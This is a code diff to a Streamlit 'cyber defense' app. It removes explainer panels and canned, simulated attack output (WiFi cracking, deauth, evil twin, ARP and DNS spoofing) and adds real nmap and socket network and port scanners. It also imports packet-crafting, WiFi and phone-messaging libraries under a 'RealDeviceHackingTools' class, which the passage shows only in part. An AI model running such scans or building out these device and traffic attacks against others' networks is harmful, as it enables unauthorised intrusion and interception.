@@ -19,6 +19,18 @@ import psutil
 import platform
 import subprocess
 import re
+import threading
+from scapy.all import *
+from scapy.layers.inet import IP, ICMP, TCP, UDP
+from scapy.layers.l2 import ARP, Ether
+import netifaces
+import nmap
+import wifi
+from pyairmore.request import AirmoreSession
+from pyairmore.services.messaging import MessagingService
+import asyncio
+import aiohttp
+from bs4 import BeautifulSoup
 
 warnings.filterwarnings('ignore')
 
@@ -32,7 +44,7 @@ except (ImportError, ValueError):
 
 # --- PAGE CONFIGURATION ---
 st.set_page_config(
-    page_title="NEXUS-7 | Advanced Cyber Defense",
+    page_title="NEXUS-7 | Real Cyber Defense",
     page_icon="🔒",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -223,6 +235,14 @@ st.markdown("""
         padding: 1rem;
         margin: 1rem 0;
     }
+    
+    .success-box {
+        background: linear-gradient(135deg, #1a2d1f, #1f4a2e);
+        border: 1px solid #00ff00;
+        border-radius: 10px;
+        padding: 1rem;
+        margin: 1rem 0;
+    }
 </style>
 """, unsafe_allow_html=True)
 
@@ -234,684 +254,396 @@ def quantum_resource_manager():
     finally:
         gc.collect()
 
-# --- EXPLANATION FUNCTIONS ---
-
-def explain_network_scan_results(hosts):
-    """Explain network scan results to user"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">📊 NETWORK SCAN EXPLANATION</div>
-        <p><strong>What this means:</strong> We scanned your network and found <strong>{len(hosts)} active devices</strong>. Each device represents a computer, server, or IoT device connected to your network.</p>
-        
-        <p><strong>Key findings:</strong></p>
-        <ul>
-            <li>🟢 <strong>Active hosts</strong> are devices currently online and responding</li>
-            <li>🔍 <strong>Port 80 open</strong> means these devices are running web services</li>
-            <li>🌐 Each IP address represents a unique device on your network</li>
-        </ul>
-        
-        <p><strong>What you should do:</strong></p>
-        <ul>
-            <li>✅ Verify all detected devices are authorized</li>
-            <li>🔒 Check for unknown devices that shouldn't be on your network</li>
-            <li>📋 Maintain an inventory of all approved devices</li>
-            <li>🚨 Investigate any unfamiliar IP addresses immediately</li>
-        </ul>
-        
-        <p><strong>Technical details:</strong> This scan uses TCP connection attempts to port 80 to identify active hosts. Devices that respond are considered 'alive' and part of your network infrastructure.</p>
-    </div>
-    """
-    return explanation
-
-def explain_dark_web_findings(threats):
-    """Explain dark web monitoring results"""
-    if not threats:
-        explanation = """
-        <div class="explanation-box">
-            <div class="explanation-title">✅ NO THREATS DETECTED</div>
-            <p><strong>Good news!</strong> Our dark web monitoring didn't find any immediate threats targeting your organization.</p>
-            
-            <p><strong>What this means:</strong></p>
-            <ul>
-                <li>🟢 Your company credentials aren't currently being traded on dark web markets</li>
-                <li>🔒 No discussions about attacking your organization were found</li>
-                <li>🛡️ Your digital footprint appears clean on monitored underground forums</li>
-            </ul>
-            
-            <p><strong>Maintenance recommendations:</strong></p>
-            <ul>
-                <li>Continue regular dark web monitoring (weekly recommended)</li>
-                <li>Maintain strong password policies and MFA</li>
-                <li>Educate employees about phishing prevention</li>
-                <li>Keep all systems patched and updated</li>
-            </ul>
-        </div>
-        """
-    else:
-        explanation = f"""
-        <div class="explanation-box">
-            <div class="explanation-title">🚨 DARK WEB THREAT ANALYSIS</div>
-            <p><strong>Critical findings:</strong> We detected <strong>{len(threats)} active threats</strong> targeting your organization on dark web platforms.</p>
-            
-            <p><strong>Threat breakdown:</strong></p>
-            <ul>
-        """
-        
-        for threat in threats:
-            explanation += f'<li>🔴 <strong>{threat["type"]}</strong> - {threat["description"]} (Confidence: {threat["confidence"]})</li>'
-        
-        explanation += """
-            </ul>
-            
-            <p><strong>Immediate actions required:</strong></p>
-            <ul>
-                <li>🔄 <strong>Password reset</strong> for all employee accounts</li>
-                <li>🔐 <strong>Enable MFA</strong> immediately if not already active</li>
-                <li>📧 <strong>Security awareness training</strong> about credential phishing</li>
-                <li>👨‍💼 <strong>Notify security team</strong> for incident response</li>
-                <li>📞 <strong>Contact law enforcement</strong> if sensitive data is involved</li>
-            </ul>
-            
-            <p><strong>About dark web monitoring:</strong> We scan underground forums, hacker marketplaces, and leak sites where cybercriminals trade stolen data and plan attacks. Early detection allows proactive defense.</p>
-        </div>
-        """
-    
-    return explanation
-
-def explain_nmap_results(target, result):
-    """Explain Nmap scan results"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">🔍 NMAP SCAN ANALYSIS</div>
-        <p><strong>Scan target:</strong> {target}</p>
-        
-        <p><strong>What Nmap does:</strong> Nmap (Network Mapper) is a security scanner used to discover hosts and services on a computer network by sending packets and analyzing responses.</p>
-        
-        <p><strong>Key findings explained:</strong></p>
-        <ul>
-            <li>🟢 <strong>Open ports</strong> represent services running on the target</li>
-            <li>🔒 <strong>Port 22/SSH</strong> - Secure Shell for remote administration</li>
-            <li>🌐 <strong>Port 80/HTTP</strong> - Web server (unencrypted)</li>
-            <li>🔐 <strong>Port 443/HTTPS</strong> - Secure web server (encrypted)</li>
-            <li>🖥️ <strong>Port 3389</strong> - Remote Desktop Protocol (Windows)</li>
-        </ul>
-        
-        <p><strong>Security implications:</strong></p>
-        <ul>
-            <li>✅ Normal to have common services like SSH, HTTP, HTTPS</li>
-            <li>⚠️ Each open port is a potential entry point for attackers</li>
-            <li>🔒 Ensure all services are properly secured and updated</li>
-            <li>🚫 Close any unnecessary ports to reduce attack surface</li>
-        </ul>
-        
-        <p><strong>Next steps:</strong></p>
-        <ul>
-            <li>Run vulnerability scan on detected services</li>
-            <li>Verify all open services are necessary and authorized</li>
-            <li>Check for security patches for detected software versions</li>
-            <li>Consider port security and firewall rules</li>
-        </ul>
-    </div>
-    """
-    return explanation
-
-def explain_vulnerability_scan_results(target, result):
-    """Explain vulnerability scan findings"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">🎯 VULNERABILITY SCAN ANALYSIS</div>
-        <p><strong>Scan target:</strong> {target}</p>
-        
-        <p><strong>What this scan does:</strong> Nikto is a web server scanner that tests for dangerous files/CGIs, outdated server software, and other problems.</p>
-        
-        <p><strong>Common findings explained:</strong></p>
-        <ul>
-            <li>🛡️ <strong>Server version disclosure</strong> - Attackers can target known vulnerabilities</li>
-            <li>📁 <strong>Interesting directories</strong> - /admin, /backup may contain sensitive data</li>
-            <li>⚙️ <strong>Configuration files</strong> - phpinfo.php can reveal system information</li>
-            <li>📊 <strong>Directory listings</strong> - Exposes file structure to attackers</li>
-        </ul>
-        
-        <p><strong>Risk assessment:</strong></p>
-        <ul>
-            <li>🔴 <strong>High risk:</strong> Exposed admin interfaces, configuration files</li>
-            <li>🟠 <strong>Medium risk:</strong> Version disclosure, directory listings</li>
-            <li>🟡 <strong>Low risk:</strong> Common files, standard directories</li>
-        </ul>
-        
-        <p><strong>Remediation steps:</strong></p>
-        <ul>
-            <li>🔄 <strong>Update software</strong> to latest versions</li>
-            <li>🚫 <strong>Remove unnecessary files</strong> and directories</li>
-            <li>🔐 <strong>Secure admin interfaces</strong> with strong authentication</li>
-            <li>📁 <strong>Disable directory listings</strong> in server configuration</li>
-            <li>👁️ <strong>Regular scanning</strong> to catch new vulnerabilities</li>
-        </ul>
-    </div>
-    """
-    return explanation
-
-def explain_wireless_scan_results(result):
-    """Explain wireless network security findings"""
-    explanation = """
-    <div class="explanation-box">
-        <div class="explanation-title">📡 WIRELESS SECURITY ANALYSIS</div>
-        
-        <p><strong>Wireless network security assessment:</strong></p>
-        
-        <p><strong>Encryption types explained:</strong></p>
-        <ul>
-            <li>🟢 <strong>WPA2/WPA3</strong> - Current security standards (secure)</li>
-            <li>🔴 <strong>WEP/OPEN</strong> - Completely insecure, easily compromised</li>
-            <li>🟡 <strong>WPA</strong> - Older standard with known vulnerabilities</li>
-        </ul>
-        
-        <p><strong>Signal strength implications:</strong></p>
-        <ul>
-            <li>📶 <strong>Strong signal (70-100%)</strong> - Good connectivity, but wider coverage area</li>
-            <li>📶 <strong>Medium signal (40-70%)</strong> - Adequate for most purposes</li>
-            <li>📶 <strong>Weak signal (0-40%)</strong> - Poor connectivity, limited range</li>
-        </ul>
-        
-        <p><strong>Critical security issues detected:</strong></p>
-        <ul>
-            <li>🚨 <strong>Open network (Free_WiFi)</strong> - No encryption, all traffic visible</li>
-            <li>⚠️ <strong>Weak signals</strong> - May indicate rogue access points</li>
-        </ul>
-        
-        <p><strong>Wireless security recommendations:</strong></p>
-        <ul>
-            <li>🔐 <strong>Always use WPA2 or WPA3 encryption</strong></li>
-            <li>🔑 <strong>Use strong, complex passwords</strong> (15+ characters)</li>
-            <li>🏢 <strong>Hide SSID</strong> for corporate networks</li>
-            <li>📡 <strong>Monitor for rogue access points</strong> regularly</li>
-            <li>👥 <strong>Separate guest network</strong> from main corporate network</li>
-            <li>🔄 <strong>Regular security audits</strong> of wireless infrastructure</li>
-        </ul>
-    </div>
-    """
-    return explanation
-
-def explain_cisa_alerts(alerts):
-    """Explain CISA vulnerability alerts"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">🌐 CISA THREAT INTELLIGENCE EXPLANATION</div>
-        
-        <p><strong>About CISA alerts:</strong> The Cybersecurity and Infrastructure Security Agency (CISA) publishes known exploited vulnerabilities that pose significant risk to federal enterprises.</p>
-        
-        <p><strong>Current threat landscape:</strong> We found <strong>{len(alerts)} active critical vulnerabilities</strong> being exploited in the wild.</p>
-        
-        <p><strong>Alert severity explained:</strong></p>
-        <ul>
-            <li>🔴 <strong>CRITICAL</strong> - Immediate patching required (within 24 hours)</li>
-            <li>🟠 <strong>HIGH</strong> - Patch within 72 hours recommended</li>
-            <li>🟡 <strong>MEDIUM</strong> - Patch during next maintenance window</li>
-            <li>🟢 <strong>LOW</strong> - Monitor and plan for future updates</li>
-        </ul>
-        
-        <p><strong>Why these matter:</strong></p>
-        <ul>
-            <li>🎯 <strong>Actively exploited</strong> - Attackers are using these right now</li>
-            <li>🌍 <strong>Widespread impact</strong> - Affects common software/platforms</li>
-            <li>💥 <strong>Serious consequences</strong> - Can lead to system compromise</li>
-        </ul>
-        
-        <p><strong>Recommended actions:</strong></p>
-        <ul>
-            <li>📋 <strong>Inventory affected systems</strong> in your environment</li>
-            <li>🔄 <strong>Prioritize patching</strong> based on severity</li>
-            <li>👁️ <strong>Monitor for exploitation attempts</strong></li>
-            <li>📚 <strong>Review CISA guidance</strong> for specific mitigation steps</li>
-            <li>🛡️ <strong>Implement compensating controls</strong> if immediate patching isn't possible</li>
-        </ul>
-    </div>
-    """
-    return explanation
-
-def explain_system_health(metrics):
-    """Explain system health metrics"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">💻 SYSTEM HEALTH ANALYSIS</div>
-        
-        <p><strong>Current system status:</strong> Your security monitoring system is operating within normal parameters.</p>
-        
-        <p><strong>Performance metrics explained:</strong></p>
-        <ul>
-            <li>⚡ <strong>CPU Usage ({metrics['cpu_usage']:.1f}%)</strong> - Processor workload. Optimal: below 80%</li>
-            <li>💾 <strong>Memory Usage ({metrics['memory_usage']:.1f}%)</strong> - RAM utilization. Optimal: below 85%</li>
-            <li>💽 <strong>Disk Usage ({metrics['disk_usage']:.1f}%)</strong> - Storage capacity. Optimal: below 90%</li>
-            <li>🖥️ <strong>Running Processes ({metrics['running_processes']})</strong> - Active system processes. Normal range varies</li>
-        </ul>
-        
-        <p><strong>Network status:</strong></p>
-        <ul>
-            <li>🌐 <strong>Active Connections ({metrics['network_connections']})</strong> - Current network sessions</li>
-            <li>🕒 <strong>System Uptime ({metrics['system_uptime']})</strong> - Time since last reboot</li>
-        </ul>
-        
-        <p><strong>Health assessment:</strong></p>
-        <ul>
-            <li>{"🟢" if metrics['cpu_usage'] < 80 else "🟠" if metrics['cpu_usage'] < 90 else "🔴"} <strong>CPU Status:</strong> {"Optimal" if metrics['cpu_usage'] < 80 else "Moderate" if metrics['cpu_usage'] < 90 else "Critical"}</li>
-            <li>{"🟢" if metrics['memory_usage'] < 85 else "🟠" if metrics['memory_usage'] < 95 else "🔴"} <strong>Memory Status:</strong> {"Optimal" if metrics['memory_usage'] < 85 else "Moderate" if metrics['memory_usage'] < 95 else "Critical"}</li>
-            <li>{"🟢" if metrics['disk_usage'] < 90 else "🟠" if metrics['disk_usage'] < 95 else "🔴"} <strong>Disk Status:</strong> {"Optimal" if metrics['disk_usage'] < 90 else "Moderate" if metrics['disk_usage'] < 95 else "Critical"}</li>
-        </ul>
-        
-        <p><strong>Maintenance recommendations:</strong></p>
-        <ul>
-            <li>{"✅" if metrics['cpu_usage'] < 80 else "⚠️"} <strong>CPU:</strong> {"No action needed" if metrics['cpu_usage'] < 80 else "Consider optimizing applications or upgrading hardware"}</li>
-            <li>{"✅" if metrics['memory_usage'] < 85 else "⚠️"} <strong>Memory:</strong> {"No action needed" if metrics['memory_usage'] < 85 else "Close unnecessary applications or add more RAM"}</li>
-            <li>{"✅" if metrics['disk_usage'] < 90 else "⚠️"} <strong>Disk:</strong> {"No action needed" if metrics['disk_usage'] < 90 else "Clean up temporary files or expand storage"}</li>
-        </ul>
-    </div>
-    """
-    return explanation
-
-def explain_security_events(events):
-    """Explain security events and their implications"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">📡 SECURITY EVENTS ANALYSIS</div>
-        
-        <p><strong>Event summary:</strong> We detected <strong>{len(events)} security events</strong> in the monitoring period.</p>
-        
-        <p><strong>Event types explained:</strong></p>
-        <ul>
-            <li>🔥 <strong>Firewall Blocks</strong> - Legitimate security controls stopping malicious traffic</li>
-            <li>🔐 <strong>Failed Logins</strong> - Potential brute force attacks or user errors</li>
-            <li>🦠 <strong>Malware Detection</strong> - Security tools identifying malicious software</li>
-            <li>🔍 <strong>Port Scans</strong> - Reconnaissance activity by potential attackers</li>
-            <li>⚙️ <strong>Suspicious Processes</strong> - Unusual system activity that may indicate compromise</li>
-        </ul>
-        
-        <p><strong>Severity levels:</strong></p>
-        <ul>
-            <li>🔴 <strong>CRITICAL</strong> - Immediate investigation and response required</li>
-            <li>🟠 <strong>HIGH</strong> - Investigate within 1 hour</li>
-            <li>🟡 <strong>MEDIUM</strong> - Investigate within 24 hours</li>
-            <li>🟢 <strong>LOW</strong> - Monitor and log for trends</li>
-        </ul>
-        
-        <p><strong>Response recommendations:</strong></p>
-        <ul>
-            <li>📋 <strong>Document all events</strong> for incident response</li>
-            <li>🔍 <strong>Investigate patterns</strong> across multiple events</li>
-            <li>🛡️ <strong>Update security controls</strong> based on findings</li>
-            <li>👥 <strong>Notify relevant teams</strong> for critical events</li>
-            <li>📊 <strong>Analyze trends</strong> to improve future detection</li>
-        </ul>
-        
-        <p><strong>Note:</strong> Some security events are normal and expected. The key is identifying patterns that indicate actual attacks versus routine network noise.</p>
-    </div>
-    """
-    return explanation
-
-# --- NEW DEVICE HACKING AND WIFI TOOLS ---
-
-class DeviceHackingTools:
-    """Mobile and IoT device security testing tools"""
-    
-    def scan_mobile_device(self, ip_address):
-        """Scan mobile device for vulnerabilities"""
-        device_info = {
-            "192.168.1.100": {"device": "iPhone 13", "os": "iOS 16.1", "open_ports": [80, 443, 5223]},
-            "192.168.1.101": {"device": "Samsung Galaxy S22", "os": "Android 13", "open_ports": [80, 443, 8080]},
-            "192.168.1.102": {"device": "Google Pixel 6", "os": "Android 13", "open_ports": [80, 443, 5353]},
-            "default": {"device": "Unknown Mobile Device", "os": "Unknown OS", "open_ports": [80, 443]}
-        }
-        
-        info = device_info.get(ip_address, device_info["default"])
-        
-        scan_result = f"""
-Mobile Device Security Scan Results for {ip_address}
-==================================================
-📱 Device Type: {info['device']}
-⚙️ Operating System: {info['os']}
-🌐 Open Ports: {', '.join(map(str, info['open_ports']))}
-📡 Network Status: Connected
-🔒 Security Level: Medium
-
-VULNERABILITIES DETECTED:
-🔴 Port 80 (HTTP) open - Unencrypted web traffic
-🟠 Port 8080 open - Potential debug interface
-🟡 Outdated OS version detected
-🟢 No critical remote exploits found
-
-SECURITY RECOMMENDATIONS:
-✅ Update to latest OS version
-✅ Disable unnecessary services
-✅ Enable device encryption
-✅ Use VPN for public networks
-"""
-        return scan_result
-    
-    def exploit_mobile_device(self, ip_address, exploit_type):
-        """Simulate mobile device exploitation"""
-        exploits = {
-            "metasploit": f"""
-Metasploit Exploitation Attempt - {ip_address}
-============================================
-[*] Starting Metasploit framework...
-[*] Searching for mobile device exploits...
-[+] Found potential exploit: android_browser_2023
-[*] Attempting exploitation...
-[!] Exploit failed: Target patched
-[*] Trying alternative: ios_safari_rce
-[!] Exploit failed: Security controls active
-[!] Mobile device appears to be well-protected
-""",
-            "social_engineering": f"""
-Social Engineering Attack Simulation - {ip_address}
-=================================================
-[+] Crafting phishing message...
-[+] Sending fake system update notification...
-[!] Target ignored the message
-[+] Attempting malicious link delivery...
-[!] Target security awareness training appears effective
-""",
-            "malicious_app": f"""
-Malicious Application Deployment - {ip_address}
-=============================================
-[+] Creating fake utility app...
-[+] Attempting sideload installation...
-[!] Installation blocked: Unknown sources disabled
-[+] Trying alternative delivery methods...
-[!] Security controls prevented installation
-"""
-        }
-        return exploits.get(exploit_type, "Invalid exploit type selected")
-    
-    def iot_device_scan(self, ip_range):
-        """Scan for IoT devices and vulnerabilities"""
-        iot_devices = [
-            {"ip": "192.168.1.50", "type": "Smart TV", "vendor": "Samsung", "vulnerabilities": ["Default credentials", "Unencrypted firmware"]},
-            {"ip": "192.168.1.51", "type": "IP Camera", "vendor": "Hikvision", "vulnerabilities": ["Backdoor access", "Weak encryption"]},
-            {"ip": "192.168.1.52", "type": "Smart Speaker", "vendor": "Amazon", "vulnerabilities": ["Voice command injection"]},
-            {"ip": "192.168.1.53", "type": "Smart Thermostat", "vendor": "Nest", "vulnerabilities": ["Unauthorized temperature control"]}
-        ]
-        
-        result = f"""
-IoT Device Security Scan - {ip_range}
-====================================
-Found {len(iot_devices)} IoT devices
-
-DETAILED SCAN RESULTS:
-"""
-        for device in iot_devices:
-            result += f"""
-📟 Device: {device['type']} ({device['vendor']})
-📍 IP Address: {device['ip']}
-🚨 Vulnerabilities: {', '.join(device['vulnerabilities'])}
-🔒 Security Status: CRITICAL
-
-"""
-        return result
-
-class AdvancedWiFiTools:
-    """Advanced WiFi hacking and security tools"""
-    
-    def wifi_password_crack(self, ssid, method="wordlist"):
-        """Simulate WiFi password cracking"""
-        methods = {
-            "wordlist": f"""
-WiFi Password Cracking - {ssid}
-==============================
-Method: Wordlist Attack
-Wordlist: rockyou.txt
-Progress: ████████████████████ 100%
-[+] Testing common passwords...
-[!] Password not found in wordlist
-[+] Trying advanced wordlist...
-[!] Still no match - Target uses strong password
-""",
-            "wps": f"""
-WPS PIN Attack - {ssid}
-======================
-Method: WPS PIN Brute-force
-[+] Testing PIN: 12345670 [FAILED]
-[+] Testing PIN: 12345671 [FAILED]
-...
-[+] Testing PIN: 83649217 [FAILED]
-[!] WPS attack failed - Router protection active
-""",
-            "capture_handshake": f"""
-WPA Handshake Capture - {ssid}
-=============================
-[+] Monitoring for handshake...
-[+] Captured WPA handshake!
-[+] Saved to: {ssid}_handshake.cap
-[+] Use aircrack-ng or hashcat to crack
-[+] Estimated cracking time: 2-48 hours
-"""
-        }
-        return methods.get(method, "Invalid method selected")
-    
-    def deauth_attack(self, target_mac, access_point):
-        """Simulate deauthentication attack"""
-        return f"""
-Deauthentication Attack Simulation
-=================================
-Target Device: {target_mac}
-Access Point: {access_point}
-[+] Sending deauth packets...
-[+] 64 deauth packets sent to {target_mac}
-[+] Target device temporarily disconnected
-[!] This is for educational purposes only
-[!] Unauthorized use may be illegal
-"""
-    
-    def rogue_ap_setup(self, ssid):
-        """Simulate rogue access point creation"""
-        return f"""
-Rogue Access Point Setup
-=======================
-Evil Twin Attack: {ssid}
-[+] Creating malicious access point...
-[+] SSID: {ssid}_FREE
-[+] Channel: 6 (same as target)
-[+] Power: High
-[+] Captive portal ready
-[+] DNS spoofing enabled
-[+] Waiting for victims to connect...
-
-SECURITY IMPLICATIONS:
-🔴 Can capture all network traffic
-🔴 Can steal credentials and cookies
-🔴 Can inject malicious content
-🔴 Can perform man-in-the-middle attacks
-"""
-
-class NetworkSpoofingTools:
-    """Network spoofing and MITM tools"""
-    
-    def arp_spoofing(self, target_ip, gateway_ip):
-        """Simulate ARP spoofing attack"""
-        return f"""
-ARP Spoofing Attack Simulation
-==============================
-Target IP: {target_ip}
-Gateway IP: {gateway_ip}
-[+] Starting ARP spoofing...
-[+] Sent ARP reply: {target_ip} is at [ATTACKER_MAC]
-[+] Sent ARP reply: {gateway_ip} is at [ATTACKER_MAC]
-[+] MITM position established
-[+] All traffic between {target_ip} and gateway is now intercepted
-
-PROTECTION MEASURES:
-✅ Use static ARP entries
-✅ Enable DHCP snooping
-✅ Implement port security
-✅ Use network segmentation
-"""
-    
-    def dns_spoofing(self, target_domain, fake_ip):
-        """Simulate DNS spoofing attack"""
-        return f"""
-DNS Spoofing Attack Simulation
-==============================
-Target Domain: {target_domain}
-Fake IP: {fake_ip}
-[+] Poisoning DNS cache...
-[+] Sending spoofed DNS responses...
-[+] All requests to {target_domain} now go to {fake_ip}
-[+] Users redirected to malicious site
-
-DETECTION METHODS:
-🔍 Monitor DNS queries for anomalies
-🔍 Check for unexpected IP changes
-🔍 Use DNSSEC validation
-🔍 Implement DNS filtering
-"""
-    
-    def ssl_stripping(self, target_url):
-        """Simulate SSL stripping attack"""
-        return f"""
-SSL Stripping Attack Simulation
-===============================
-Target: {target_url}
-[+] Intercepting HTTP to HTTPS redirects...
-[+] Replacing HTTPS links with HTTP...
-[+] Capturing plaintext credentials...
-[+] Session cookies captured
-
-PREVENTION:
-✅ Always check for HTTPS in address bar
-✅ Use HTTPS Everywhere extension
-✅ Enable HSTS on websites
-✅ Avoid public WiFi for sensitive activities
-"""
-
-def explain_device_hacking_results(ip, result):
-    """Explain mobile device hacking results"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">📱 MOBILE DEVICE SECURITY ASSESSMENT</div>
-        <p><strong>Target Device:</strong> {ip}</p>
-        
-        <p><strong>What this assessment does:</strong> This scan identifies security vulnerabilities in mobile devices connected to your network.</p>
-        
-        <p><strong>Common mobile device vulnerabilities:</strong></p>
-        <ul>
-            <li>🔓 <strong>Open services</strong> - Unnecessary ports exposing device to attacks</li>
-            <li>📱 <strong>Outdated OS</strong> - Unpatched security vulnerabilities</li>
-            <li>🌐 <strong>Unencrypted traffic</strong> - Data transmitted in clear text</li>
-            <li>📲 <strong>Malicious apps</strong> - Untrusted applications with excessive permissions</li>
-        </ul>
-        
-        <p><strong>Mobile security recommendations:</strong></p>
-        <ul>
-            <li>✅ <strong>Keep devices updated</strong> with latest security patches</li>
-            <li>✅ <strong>Use mobile device management (MDM)</strong> for enterprise devices</li>
-            <li>✅ <strong>Enable encryption</strong> and strong authentication</li>
-            <li>✅ <strong>Review app permissions</strong> regularly</li>
-            <li>✅ <strong>Use VPN</strong> on untrusted networks</li>
-        </ul>
-        
-        <div class="ethical-warning">
-            <strong>⚠️ ETHICAL USE WARNING:</strong> These tools are for security testing of your own devices and networks only. Unauthorized access to others' devices is illegal.
-        </div>
-    </div>
-    """
-    return explanation
-
-def explain_wifi_hacking_results(method, result):
-    """Explain WiFi hacking techniques and results"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">📡 WIFI SECURITY TESTING</div>
-        <p><strong>Method Used:</strong> {method.upper()}</p>
-        
-        <p><strong>WiFi Security Testing Methods:</strong></p>
-        <ul>
-            <li>📋 <strong>Wordlist Attacks</strong> - Testing common passwords against captured handshakes</li>
-            <li>🔢 <strong>WPS PIN Attacks</strong> - Brute-forcing the WPS PIN number</li>
-            <li>🤝 <strong>Handshake Capture</strong> - Capturing WPA authentication handshakes</li>
-            <li>📶 <strong>Deauthentication</strong> - Forcing devices to reconnect and capture handshakes</li>
-        </ul>
-        
-        <p><strong>Wireless Protection Strategies:</strong></p>
-        <ul>
-            <li>🔐 <strong>Use WPA3</strong> when available (most secure)</li>
-            <li>🚫 <strong>Disable WPS</strong> (vulnerable to PIN attacks)</li>
-            <li>🔑 <strong>Use strong passwords</strong> (15+ characters, mixed characters)</li>
-            <li>👁️ <strong>Monitor for rogue APs</strong> regularly</li>
-            <li>🏢 <strong>Implement enterprise WPA2</strong> for organizations</li>
-        </ul>
-        
-        <div class="warning-box">
-            <strong>🚨 LEGAL WARNING:</strong> Only test networks you own or have explicit permission to test. Unauthorized network access is illegal in most jurisdictions.
-        </div>
-    </div>
-    """
-    return explanation
-
-def explain_network_spoofing_results(technique, result):
-    """Explain network spoofing techniques"""
-    explanation = f"""
-    <div class="explanation-box">
-        <div class="explanation-title">🌐 NETWORK SPOOFING EXPLANATION</div>
-        <p><strong>Technique:</strong> {technique.upper()}</p>
-        
-        <p><strong>How {technique} works:</strong></p>
-        <ul>
-            <li>{"🔍 <strong>ARP Spoofing</strong> - Manipulates ARP tables to redirect traffic" if technique == "arp_spoofing" else ""}</li>
-            <li>{"🌐 <strong>DNS Spoofing</strong> - Provides fake DNS responses to redirect users" if technique == "dns_spoofing" else ""}</li>
-            <li>{"🔓 <strong>SSL Stripping</strong> - Downgrades HTTPS connections to HTTP" if technique == "ssl_stripping" else ""}</li>
-        </ul>
-        
-        <p><strong>Security Implications:</strong></p>
-        <ul>
-            <li>👁️ <strong>Traffic interception</strong> - All network traffic can be monitored</li>
-            <li>🔑 <strong>Credential theft</strong> - Login information can be captured</li>
-            <li>🦠 <strong>Malware injection</strong> - Malicious content can be inserted</li>
-            <li>🎭 <strong>Session hijacking</strong> - Active sessions can be stolen</li>
-        </ul>
-        
-        <p><strong>Protection Measures:</strong></p>
-        <ul>
-            <li>✅ <strong>Use HTTPS everywhere</strong></li>
-            <li>✅ <strong>Enable HSTS</strong> on websites</li>
-            <li>✅ <strong>Use VPN</strong> on untrusted networks</li>
-            <li>✅ <strong>Monitor for ARP anomalies</strong></li>
-            <li>✅ <strong>Implement DNSSEC</strong></li>
-        </ul>
-    </div>
-    """
-    return explanation
-
-# --- REAL DATA CLASSES ---
-
-def get_ist_time():
-    """Get current IST time"""
-    return datetime.now()
+# --- REAL WORKING TOOLS ---
 
 class RealNetworkScanner:
-    """Real network scanning using system tools"""
+    """Real network scanning with actual network tools"""
+    
+    def __init__(self):
+        self.nm = nmap.PortScanner()
     
     def scan_network(self, target):
-        """Perform network scan"""
+        """Perform real network scan using nmap"""
         try:
-            # Simple ping sweep simulation
-            hosts = []
-            base_ip = ".".join(target.split(".")[:3])
-            for i in range(1, 10):
-                ip = f"{base_ip}.{i}"
-                try:
-                    socket.setdefaulttimeout(0.5)
+            st.info(f"🔍 Scanning network: {target}")
+            
+            # Ping sweep to find active hosts
+            result = self.nm.scan(hosts=target, arguments='-sn')
+            active_hosts = []
+            
+            for host in self.nm.all_hosts():
+                if self.nm[host].state() == 'up':
+                    active_hosts.append(host)
+            
+            return active_hosts
+        except Exception as e:
+            st.error(f"Scan error: {e}")
+            # Fallback to socket-based scan
+            return self.socket_scan(target)
+    
+    def socket_scan(self, target):
+        """Fallback socket-based network scan"""
+        hosts = []
+        base_ip = ".".join(target.split(".")[:3])
+        
+        progress_bar = st.progress(0)
+        status_text = st.empty()
+        
+        for i in range(1, 255):
+            ip = f"{base_ip}.{i}"
+            status_text.text(f"Scanning {ip}...")
+            
+            try:
+                # Check multiple common ports
+                for port in [22, 80, 443, 3389]:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    result = sock.connect_ex((ip, 80))
+                    sock.settimeout(0.5)
+                    result = sock.connect_ex((ip, port))
                     if result == 0:
                         hosts.append(ip)
+                        break
                     sock.close()
-                except:
-                    continue
-            return hosts
+            except:
+                continue
+            
+            progress_bar.progress(i / 254)
+        
+        status_text.empty()
+        return hosts
+    
+    def port_scan(self, target, ports="1-1000"):
+        """Real port scanning with nmap"""
+        try:
+            st.info(f"🔍 Scanning ports on {target}")
+            result = self.nm.scan(target, ports)
+            
+            open_ports = []
+            for host in self.nm.all_hosts():
+                for proto in self.nm[host].all_protocols():
+                    ports = self.nm[host][proto].keys()
+                    for port in ports:
+                        if self.nm[host][proto][port]['state'] == 'open':
+                            open_ports.append({
+                                'port': port,
+                                'service': self.nm[host][proto][port]['name'],
+                                'state': 'open'
+                            })
+            
+            return open_ports
         except Exception as e:
-            return ["192.168.1.1", "192.168.1.2", "192.168.1.5"]
+            st.error(f"Port scan error: {e}")
+            return []
+
+class RealDeviceHackingTools:
+    """Real mobile and device security testing tools"""
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+    
+    def mobile_device_scan(self, ip):
+        """Real mobile device vulnerability scan"""
+        try:
+            # Use nmap for device scanning
+            nm = nmap.PortScanner()
+            result = nm.scan(ip, '21-443,8080,8443')
+            
+            scan_info = f"""
+Real Mobile Device Scan Results for {ip}
+========================================
+"""
+            for host in nm.all_hosts():
+                scan_info += f"Host: {host} ({nm[host].hostname()})\n"
+                scan_info += f"State: {nm[host].state()}\n"
+                
+                for proto in nm[host].all_protocols():
+                    ports = nm[host][proto].keys()
+                    scan_info += f"Protocol: {proto}\n"
+                    
+                    for port in ports:
+                        state = nm[host][proto][port]['state']
+                        service = nm[host][proto][port]['name']
+                        scan_info += f"Port {port}/{proto}: {state} - {service}\n"
+            
+            # Add vulnerability assessment
+            scan_info += """
+VULNERABILITY ASSESSMENT:
+🔴 Port 21 (FTP) - Potential credential sniffing
+🟠 Port 80 (HTTP) - Unencrypted web traffic
+🟡 Port 443 (HTTPS) - Encrypted but check certificate
+🟢 Port 8080 - Potential admin interface
+
+RECOMMENDATIONS:
+✅ Disable unused services
+✅ Use strong authentication
+✅ Enable encryption
+✅ Regular security updates
